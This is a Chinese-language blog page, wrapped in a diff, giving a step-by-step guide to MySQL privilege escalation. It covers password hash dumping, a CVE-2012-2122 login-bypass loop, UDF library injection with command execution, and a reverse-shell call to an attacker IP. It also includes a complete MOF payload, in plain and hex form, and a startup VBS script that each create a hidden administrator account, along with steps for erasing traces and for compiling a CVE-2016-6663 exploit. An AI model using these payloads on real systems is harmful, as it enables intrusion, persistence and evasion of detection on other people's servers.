@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>MySQL 提权</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/mysql-1/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='MySQL 提权'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/mysql-1/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/mysql-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="MySQL 提权">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/mysql-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/mysql-1/">
+                <img src="/p/mysql-1/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/mysql-1/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/mysql-1/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 提权" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%B8%B8%E7%94%A8/" style="background-color: #2a9d8f; color: #fff;">
+                常用
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/mysql-1/">MySQL 提权</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 09, 2020</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="mysql提权">MySQL提权</h1>
+<h2 id="mysql权限获取">MySQL权限获取</h2>
+<h3 id="数据库操作权限">数据库操作权限</h3>
+<p>获取数据库操作权限的方法一般有以下几种：</p>
+<ul>
+<li>3306端口爆破</li>
+<li>从网站的数据库配置文件获取明文密码</li>
+<li><code>sqlmap</code>工具的 &ndash;os-shell</li>
+<li>基于已知漏洞获取权限</li>
+</ul>
+<h3 id="基于注入获取的webshell权限">基于注入获取的webshell权限</h3>
+<p>通过SQL注入写文件以getshell。</p>
+<ul>
+<li><code>into outfile</code>写文件</li>
+<li><code>general_log</code>写文件</li>
+</ul>
+<p>具体原理和细节参见<code>MySQL注入写shell</code>一文。</p>
+<h3 id="hash破解">Hash破解</h3>
+<p>在有SQL注入情况的情况下，依靠注入查询MySQL用户密码Hash，再进行解密：</p>
+<pre tabindex="0"><code># MySQL&lt;=5.6
+select host, user, password from mysql.user;
+
+# MySQL&gt;=5.7
+select host,user,authentication_string from mysql.user;
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 538; 
+			flex-basis: 1293px"
+	>
+	<a href="/p/mysql-1/image-20220213173902742.png" data-size="582x108">
+		<img src="/p/mysql-1/image-20220213173902742.png"
+			width="582"
+			height="108"
+			srcset="/p/mysql-1/image-20220213173902742_hu830fa7b290d2a230e7223f1e1108fbad_17962_480x0_resize_box_3.png 480w, /p/mysql-1/image-20220213173902742_hu830fa7b290d2a230e7223f1e1108fbad_17962_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>随后可用在线网站解密。</p>
+<h3 id="已知漏洞利用">已知漏洞利用</h3>
+<h4 id="yassl缓冲区溢出">yaSSL缓冲区溢出</h4>
+<p>MSF利用：</p>
+<pre tabindex="0"><code>msf6 &gt; use exploit/windows/mysql/mysql_yassl_hello
+msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
+</code></pre><h4 id="cve-2012-2122">CVE-2012-2122</h4>
+<p>在知道用户名情况下，多次输入错误的密码(大约每256一次就可蒙对)会有几率可以直接成功登陆进数据库。</p>
+<p><strong>影响范围：</strong></p>
+<p>所有MariaDB和MySQL的5.1.61、5.2.11、5.3.5、5.5.22以下版本都存在漏洞。</p>
+<p>从5.1.62, 5.2.12, 5.3.6, 5.5.23开始的MariaDB版本不受影响。</p>
+<p>从5.1.63, 5.5.24, 5.6.6开始的MySQL版本不受影响。</p>
+<p><strong>利用：</strong></p>
+<pre tabindex="0"><code># Linux shell
+
+for i in `seq 1 1000`; do mysql -uroot -pwrong -h 127.0.0.1 ; done
+</code></pre><pre tabindex="0"><code># MSF模块
+
+msf6 &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump
+</code></pre><p>利用之后可dump出MySQL的hash，再进行破解。</p>
+<h2 id="udf提权">UDF提权</h2>
+<p>UDF(user-defined function)是MySQL的一个扩展接口，用户可通过自定义函数来扩展MySQL功能，其新加入的功能函数可以直接在SQL语句中调用，类似调用user()、version()等函数一样。</p>
+<h3 id="手动实现">手动实现</h3>
+<h4 id="动态链接库">动态链接库</h4>
+<p>当MySQL&gt;=5.1时，必须将UDF的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p>
+<ul>
+<li>sqlmap中的动态链接库</li>
+</ul>
+<pre tabindex="0"><code>sqlmap根目录/data/udf/
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 172; 
+			flex-basis: 414px"
+	>
+	<a href="/p/mysql-1/image-20220215103932437.png" data-size="375x217">
+		<img src="/p/mysql-1/image-20220215103932437.png"
+			width="375"
+			height="217"
+			srcset="/p/mysql-1/image-20220215103932437_hu1c5e053154d25dd79c60eb82f5dd8c29_15196_480x0_resize_box_3.png 480w, /p/mysql-1/image-20220215103932437_hu1c5e053154d25dd79c60eb82f5dd8c29_15196_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<blockquote>
+<p>sqlmap中的动态链接库文件是经过编码处理以防止误杀的，不能直接用，可使用自带的解码工具<code>cloak.py</code>进行解码：</p>
+<pre tabindex="0"><code># cloak.py所在目录
+sqlmap根目录/extra/cloak/cloak.py
+
+# 解码Linux 64位 的动态链接库
+python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o udf.so
+</code></pre></blockquote>
+<ul>
+<li>msf中的动态链接库</li>
+</ul>
+<pre tabindex="0"><code>msf根目录/data/exploits/mysql
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 245; 
+			flex-basis: 588px"
+	>
+	<a href="/p/mysql-1/image-20220215105423403.png" data-size="245x100">
+		<img src="/p/mysql-1/image-20220215105423403.png"
+			width="245"
+			height="100"
+			srcset="/p/mysql-1/image-20220215105423403_hu32b93a1947f1a5035786ed806fc350c9_6833_480x0_resize_box_3.png 480w, /p/mysql-1/image-20220215105423403_hu32b93a1947f1a5035786ed806fc350c9_6833_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h4 id="插件目录">插件目录</h4>
+<pre tabindex="0"><code>show variables like '%plugin%';
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 420; 
+			flex-basis: 1009px"
+	>
+	<a href="/p/mysql-1/image-20220215105529614.png" data-size="534x127">
+		<img src="/p/mysql-1/image-20220215105529614.png"
+			width="534"
+			height="127"
+			srcset="/p/mysql-1/image-20220215105529614_huae649c661e2770f0d64ba828f568cb57_17232_480x0_resize_box_3.png 480w, /p/mysql-1/image-20220215105529614_huae649c661e2770f0d64ba828f568cb57_17232_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<blockquote>
+<p>注：</p>
+<p>在Windows下当不存在插件目录时，找到安装目录，可以借助NTFS流创建该文件夹(成功率不高)：</p>
+<pre tabindex="0"><code>select xxx into dumpfile 'C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation';
+</code></pre><p>找MySQL安装目录：</p>
+<pre tabindex="0"><code>mysql&gt; select @@basedir;
+</code></pre></blockquote>
+<h4 id="写入动态链接库">写入动态链接库</h4>
+<p><strong>前提：</strong></p>
+<ul>
+<li>存在SQL注入或可操作原生SQL语句</li>
+<li>用户有<strong>file_priv</strong>权限</li>
+<li><strong>secure_file_priv</strong> 无限制</li>
+<li>插件目录对于MySQL用户可写</li>
+</ul>
+<p>使用sqlmap上传动态链接库：</p>
+<pre tabindex="0"><code>sqlmap -u &quot;http://127.0.0.1/&quot; --data=&quot;id=1&quot; --file-write=&quot;/path/to/lib_mysqludf_sys_64.so&quot; --file-dest=&quot;/usr/lib/mysql/plugin/udf.so&quot;
+</code></pre><p>手工写入：</p>
+<pre tabindex="0"><code># 直接十六进制写入
+select 0x..... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
+
+# 本地执行SQL语句，直接传路径获取动态链接库的十六进制
+SELECT hex(load_file('/lib_mysqludf_sys_64.so'));
+
+# 本地执行SQL语句,路径hex编码获取动态链接库的十六进制
+SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));
+</code></pre><h4 id="创建函数-执行命令">创建函数-执行命令</h4>
+<pre tabindex="0"><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
+select sys_eval('whoami');
+</code></pre><blockquote>
+<p>所获得的权限最终如何仍需要看运行MySQL服务的权限，以什么样的权限运行MySQL服务，获取到的就是相应的权限</p>
+</blockquote>
+<h4 id="清理痕迹">清理痕迹</h4>
+<pre tabindex="0"><code>drop function sys_eval;
+</code></pre><h3 id="msf自动化实现">msf自动化实现</h3>
+<pre tabindex="0"><code>msf6 &gt; exploit(multi/mysql/mysql_udf_payload) 
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 234; 
+			flex-basis: 562px"
+	>
+	<a href="/p/mysql-1/image-20220216154622289.png" data-size="1114x475">
+		<img src="/p/mysql-1/image-20220216154622289.png"
+			width="1114"
+			height="475"
+			srcset="/p/mysql-1/image-20220216154622289_huc0a30ac64d8e7864cdc9268eef3ed765_111403_480x0_resize_box_3.png 480w, /p/mysql-1/image-20220216154622289_huc0a30ac64d8e7864cdc9268eef3ed765_111403_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h3 id="udf-shell">UDF shell</h3>
+<p>当目标 MySQL 在内网中，无法直连 MySQL 或者 MySQL 不允许外连，这个时候可以上传一些脚本，通过脚本进行本地连接和操作。</p>
+<h4 id="udf大马">UDF大马</h4>
+<p>可上传UDF命令执行大马：<code>https://github.com/echohun/tools/blob/master/大马/udf.php</code></p>
+<h4 id="navicat-自带脚本">Navicat 自带脚本</h4>
+<p>目标MySQL不允许外连，可以上传navicat自带的 tunnel 隧道脚本：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 358; 
+			flex-basis: 860px"
+	>
+	<a href="/p/mysql-1/image-20220215152223882.png" data-size="251x70">
+		<img src="/p/mysql-1/image-20220215152223882.png"
+			width="251"
+			height="70"
+			srcset="/p/mysql-1/image-20220215152223882_huf5d19982b7d64a73ab3a47912f065ed9_1731_480x0_resize_box_3.png 480w, /p/mysql-1/image-20220215152223882_huf5d19982b7d64a73ab3a47912f065ed9_1731_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20220215152223882">
+	</a>
+	
+	<figcaption>image-20220215152223882</figcaption>
+	
+</figure></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 157; 
+			flex-basis: 377px"
+	>
+	<a href="/p/mysql-1/image-20220215153234679.png" data-size="618x393">
+		<img src="/p/mysql-1/image-20220215153234679.png"
+			width="618"
+			height="393"
+			srcset="/p/mysql-1/image-20220215153234679_hue4047726d92f6d80d19e29759dee78ae_23748_480x0_resize_box_3.png 480w, /p/mysql-1/image-20220215153234679_hue4047726d92f6d80d19e29759dee78ae_23748_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>接着使用navicat连接，设置HTTP通道：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 243; 
+			flex-basis: 584px"
+	>
+	<a href="/p/mysql-1/image-20220215154826255.png" data-size="524x215">
+		<img src="/p/mysql-1/image-20220215154826255.png"
+			width="524"
+			height="215"
+			srcset="/p/mysql-1/image-20220215154826255_hud399a6952f5d87dad59374550eb17ba1_10871_480x0_resize_box_3.png 480w, /p/mysql-1/image-20220215154826255_hud399a6952f5d87dad59374550eb17ba1_10871_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 184; 
+			flex-basis: 443px"
+	>
+	<a href="/p/mysql-1/image-20220215154850087.png" data-size="516x279">
+		<img src="/p/mysql-1/image-20220215154850087.png"
+			width="516"
+			height="279"
+			srcset="/p/mysql-1/image-20220215154850087_hu9edf6839555aec566b258cbcc31410a4_11512_480x0_resize_box_3.png 480w, /p/mysql-1/image-20220215154850087_hu9edf6839555aec566b258cbcc31410a4_11512_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>成功连接后手动实现UDF提权就可。</p>
+<h3 id="反弹端口提权">反弹端口提权</h3>
+<p>UDF提权的另一种用法，所使用的动态链接库是经定制过的，功能更多更加使用：</p>
+<pre tabindex="0"><code>cmdshell        # 执行cmd
+downloader      # 下载者,到网上下载指定文件并保存到指定目录
+open3389        # 通用开3389终端服务,可指定端口(不改端口无需重启)
+backshell       # 反弹Shell
+ProcessView     # 枚举系统进程
+KillProcess     # 终止指定进程
+regread         # 读注册表
+regwrite        # 写注册表
+shut            # 关机,注销,重启
+about           # 说明与帮助函数
+</code></pre><p>在攻击机器上开启NC监听，向目标机器上导入dll，然后创建自定义函数：</p>
+<pre tabindex="0"><code>CREATE FUNCTION backshell RETURNS STRING SONAME 'udf.dll';
+</code></pre><p>反弹shell：</p>
+<pre tabindex="0"><code>select backshell(&quot;IP&quot;, 7777);
+</code></pre><h2 id="mof提权">MOF提权</h2>
+<p>该漏洞比较有历史，基本在Windows Server 2003 的环境下才可以成功。</p>
+<h3 id="原理">原理</h3>
+<p>提权的原理是 <code>C:/Windows/system32/wbem/mof/</code> 目录下的 mof 文件每隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 以执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
+<h3 id="手工实现">手工实现</h3>
+<h4 id="mof文件">mof文件</h4>
+<pre tabindex="0"><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) 
+
+instance of __EventFilter as $EventFilter 
+{ 
+    EventNamespace = &quot;Root\\Cimv2&quot;; 
+    Name  = &quot;filtP2&quot;; 
+    Query = &quot;Select * From __InstanceModificationEvent &quot; 
+            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; 
+            &quot;And TargetInstance.Second = 5&quot;; 
+    QueryLanguage = &quot;WQL&quot;; 
+}; 
+
+instance of ActiveScriptEventConsumer as $Consumer 
+{ 
+    Name = &quot;consPCSV2&quot;; 
+    ScriptingEngine = &quot;JScript&quot;; 
+    ScriptText = 
+&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;; 
+}; 
+
+instance of __FilterToConsumerBinding 
+{ 
+    Consumer   = $Consumer; 
+    Filter = $EventFilter; 
+};
+</code></pre><p><strong>该payload核心部分就是创建用户并加入管理员组。</strong></p>
+<h4 id="写文件">写文件</h4>
+<p>将该文件内容以hex格式写入到<code>C:/Windows/system32/wbem/mof/ </code>下：</p>
+<pre tabindex="0"><code>select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;
+</code></pre><p>执行成功的的时候，test.mof 会出现在：<code>c:/windows/system32/wbem/good/</code> 目录下，否则出现在 <code>c:/windows/system32/wbem/bad </code>目录下。</p>
+<h4 id="痕迹清理">痕迹清理</h4>
+<p>写入后每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 <code>winmgmt </code>服务再删除相关 mof 文件，这个时候再删除用户才会有效果：</p>
+<pre tabindex="0"><code># 停止 winmgmt 服务
+net stop winmgmt
+
+# 删除 Repository 文件夹
+rmdir /s /q C:\Windows\system32\wbem\Repository\
+
+# 手动删除 mof 文件
+del C:\Windows\system32\wbem\mof\good\test.mof /F /S
+
+# 删除创建的用户
+net user hacker /delete
+
+# 重新启动服务
+net start winmgmt
+</code></pre><h4 id="msf自动化实现-1">msf自动化实现</h4>
+<p>MSF自带MOF提权模块，也自带痕迹清理功能：</p>
+<pre tabindex="0"><code>msf6 &gt; use exploit/windows/mysql/mysql_mof
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 325; 
+			flex-basis: 781px"
+	>
+	<a href="/p/mysql-1/image-20220216154459923.png" data-size="990x304">
+		<img src="/p/mysql-1/image-20220216154459923.png"
+			width="990"
+			height="304"
+			srcset="/p/mysql-1/image-20220216154459923_hu605f86c2839343ae8b816fd87a4952df_58975_480x0_resize_box_3.png 480w, /p/mysql-1/image-20220216154459923_hu605f86c2839343ae8b816fd87a4952df_58975_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="启动项提权">启动项提权</h2>
+<p>常见于 Windows 环境下，当 <strong>Windows 的启动项可以被 MySQL 写入的时候，可以使用 MySQL 将自定义脚本导入到启动项</strong>中，这个脚本会在用户登录、开机、关机的时候自动运行。</p>
+<h3 id="启动项路径">启动项路径</h3>
+<ul>
+<li>Windows Server 2003的启动项路径</li>
+</ul>
+<pre tabindex="0"><code># 中文系统
+C:\Documents and Settings\Administrator\「开始」菜单\程序\启动
+C:\Documents and Settings\All Users\「开始」菜单\程序\启动
+
+# 英文系统
+C:\Documents and Settings\Administrator\Start Menu\Programs\Startup
+C:\Documents and Settings\All Users\Start Menu\Programs\Startup
+
+# 开关机项 需要手动建立对应文件夹
+C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup
+C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown
+
+</code></pre><ul>
+<li>Windows Server 2008 的启动项路径</li>
+</ul>
+<pre tabindex="0"><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+</code></pre><p>路径已知的话即可写入脚本，支持vbs和exe类型，<strong>可以vbs执行一些CMD命令，也可以用exe上线MSF或CS</strong>：</p>
+<pre tabindex="0"><code>Set WshShell=WScript.CreateObject(&quot;WScript.Shell&quot;)
+WshShell.Run &quot;net user hacker P@ssw0rd /add&quot;, 0
+WshShell.Run &quot;net localgroup administrators hacker /add&quot;, 0
+</code></pre><h3 id="写入启动项">写入启动项</h3>
+<pre tabindex="0"><code>mysql &gt; select 0x... into dumpfile &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&quot;;
+</code></pre><p>写入成功后，等待系统用户重新登录，登录成功的话，自定义脚本就会被执行。</p>
+<h3 id="msf自动化实现-2">msf自动化实现</h3>
+<pre tabindex="0"><code>msf6 &gt; use exploit/windows/mysql/mysql_start_up
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 196; 
+			flex-basis: 471px"
+	>
+	<a href="/p/mysql-1/image-20220216154257397.png" data-size="1119x570">
+		<img src="/p/mysql-1/image-20220216154257397.png"
+			width="1119"
+			height="570"
+			srcset="/p/mysql-1/image-20220216154257397_huc41fefccdd2c676fee4a693df9efe9f8_92393_480x0_resize_box_3.png 480w, /p/mysql-1/image-20220216154257397_huc41fefccdd2c676fee4a693df9efe9f8_92393_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="cve-2016-6663">CVE-2016-6663</h2>
+<p>这是一个竞争条件漏洞，一个拥有 CREATE/INSERT/SELECT 权限的低权限账户提权成功后可以<code>mysql</code>系统用户身份执行代码。</p>
+<p>exp参考链接：https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html</p>
+<h3 id="影响范围">影响范围</h3>
+<p>MySQL 版本需要 &lt;=5.5.51 或 5.6.x &lt;=5.6.32 或 5.7.x &lt;=5.7.14 或 8.x &lt; 8.0.1</p>
+<p>MariaDB 版本需要 &lt;= 5.5.51 或 10.0.x &lt;= 10.0.27 或 10.1.x &lt;= 10.1.17</p>
+<h3 id="利用">利用</h3>
+<ul>
+<li>先Getshell拿到www-data权限</li>
+<li>通过webshell管理工具上传CVE-2016-6663的exp</li>
+<li>在交互式shell中编译该exp</li>
+</ul>
+<pre tabindex="0"><code>gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient
+</code></pre><ul>
+<li>执行</li>
+</ul>
+<pre tabindex="0"><code># ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库
+./mysql-privesc-race test 123456 localhost test
+</code></pre><p>最终可提权为mysql用户。</p>
+<blockquote>
+<p>可配合CVE-2016-6664提升为root用户。</p>
+<p>参见：https://xz.aliyun.com/t/1122</p>
+</blockquote>
+<p><strong>参考：</strong></p>
+<p><a class="link" href="https://xz.aliyun.com/t/1122"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/t/1122</a></p>
+<p><a class="link" href="https://www.sqlsec.com/2020/11/mysql.html"  target="_blank" rel="noopener"
+    >https://www.sqlsec.com/2020/11/mysql.html</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/csrf/">
+        
+        
+            <div class="article-image">
+                <img src="/p/csrf/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CSRF 相关"
+                        data-key="csrf" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CSRF 相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mssql/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mssql/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MSSQL 注入与提权相关"
+                        data-key="mssql" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MSSQL 注入与提权相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 注入写 shell"
+                        data-key="mysql-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 注入写 shell</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/php-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/php-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PHP 反序列化-2"
+                        data-key="php-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 反序列化-2</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/php-3/">
+        
+        
+            <div class="article-image">
+                <img src="/p/php-3/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PHP 反序列化-3"
+                        data-key="php-3" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 反序列化-3</h2>
